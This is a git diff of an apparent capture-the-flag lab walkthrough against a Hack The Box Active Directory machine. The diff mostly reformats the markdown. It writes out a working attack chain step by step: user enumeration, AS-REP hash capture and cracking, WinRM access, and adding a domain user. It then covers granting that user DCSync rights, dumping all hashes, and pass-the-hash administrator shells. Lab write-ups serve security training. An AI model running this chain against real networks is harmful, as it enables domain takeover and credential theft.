@@ -24,6 +24,7 @@ nmap 10.129.95.210 -A
 
 - Port 445 SMB is open
 - Enumerate with enum4linux
+
 ```bash
 enum4linux 10.129.95.210
 
@@ -36,13 +37,15 @@ enum4linux 10.129.95.210
 ![image3](../resources/12f7a24d9c9042fa9df1e633361e6493.png)
 
 - <u>Can also use LDAP to enumerate:</u>
+
 ```bash
-ldapsearch -H ldap://10.129.95.210 -x -s base -b '' "(objectClass=\*)" "\*" +
+ldapsearch -H ldap://10.129.95.210 -x -s base -b '' "(objectClass=*)" "*" +
 ```
 
 ![image4](../resources/654647aff37743419fe09ff3eb012172.png)
+
 ```bash
-ldapsearch -H ldap://10.129.95.210 -x -b "DC=htb,DC=local" \| grep "dn: CN=" \| grep "OU="
+ldapsearch -H ldap://10.129.95.210 -x -b "DC=htb,DC=local" | grep "dn: CN=" | grep "OU="
 ```
 
 ![image5](../resources/fcedadc34f5c47498612578acbe9a079.png)
@@ -52,6 +55,7 @@ ldapsearch -H ldap://10.129.95.210 -x -b "DC=htb,DC=local" \| grep "dn: CN=" \| 
 - Add users in a file (**users**)
 
 - Check if usernames are valid:
+
 ```bash
 kerbrute userenum --dc 10.129.95.210 -d htb.local users -o validusers.txt
 
@@ -60,6 +64,7 @@ kerbrute userenum --dc 10.129.95.210 -d htb.local users -o validusers.txt
 ![image6](../resources/3d882de76f884541bc79be2f2bf636a0.png)
 
 - Vind vulnerable users:
+
 ```bash
 impacket-GetNPUsers htb.local/ -users users -no-pass -dc-ip 10.129.95.210
 
@@ -68,6 +73,7 @@ impacket-GetNPUsers htb.local/ -users users -no-pass -dc-ip 10.129.95.210
 ![image7](../resources/f025b74aec67441f97fb2deff533359e.png)
 
 - Save the whole hash to a file and use hashcat:
+
 ```bash
 hashcat -m 18200 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 
@@ -78,16 +84,18 @@ hashcat -m 18200 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 Got credentials for a service account.
 
 - Test with CME:
+
 ```bash
-crackmapexec smb 10.129.95.210 -u svc-alfresco -p \<password\>
+crackmapexec smb 10.129.95.210 -u svc-alfresco -p <password>
 
 ```
 
 ![image9](../resources/df6387c210d444d49f6852fd97b7b6c4.png)
 
 - Remote using WinRM:
+
 ```bash
-evil-winrm -i 10.129.95.210 -u svc-alfresco -p \<password\>
+evil-winrm -i 10.129.95.210 -u svc-alfresco -p <password>
 
 ```
 
@@ -115,21 +123,25 @@ Members of this group can create and modify most types of accounts, including ac
 Group members can log in locally to domain controllers
 
 - Upload Sharphound:
+
 ```bash
 upload SharpHound.exe
 
 ```
 - Run Sharphound:
+
 ```bash
 .\SharpHound.exe --CollectionMethods All --Domain htb.local --ZipFileName loot.zip
 
 ```
 - Download the loot.zip file:
+
 ```bash
 download 20240205024401_loot.zip
 
 ```
 - Start Neo4j:
+
 ```bash
 sudo neo4j console
 
@@ -191,16 +203,19 @@ And we need DA
 - **<u>To exploit:</u>**
 
 - Create a new user (tooby):
+
 ```bash
 net user tooby Password123! /add /domain
 
 ```
 - Add to the group Exchange Windows Permissions
+
 ```bash
 net group "Exchange Windows Permissions" tooby /add
 
 ```
 - Open the menu in evil-winrm:
+
 ```bash
 menu
 
@@ -221,6 +236,7 @@ menu
   $Cred = New-Object System.Management.Automation.PSCredential('htb\tooby', $SecPassword)
   Add-DomainObjectAcl -PrincipalIdentity tooby -Credential $Cred -Rights DCSync
 ```
+
 - User tooby has DCSync rights now
 
 - Run a DCSync to get hashes:
@@ -236,6 +252,7 @@ impacket-secretsdump htb/tooby:'Password123!'@10.129.95.210 -dc-ip 10.129.95.210
 - **<u>Get shell:</u>**
 
 - <u>Psexec:</u>
+
 ```bash
 impacket-psexec htb/administrator@10.129.95.210 -hashes "<password_hash>"
 ```
@@ -246,6 +263,7 @@ impacket-psexec htb/administrator@10.129.95.210 -hashes "<password_hash>"
 ![image26](../resources/c5363a4bedf249f986ba565afdf8074c.png)
 
 - <u>Evil-WinRM:</u>
+
 ```bash
 evil-winrm -i 10.129.95.210 -u administrator -H "<second_half_of_hash>"
 ```
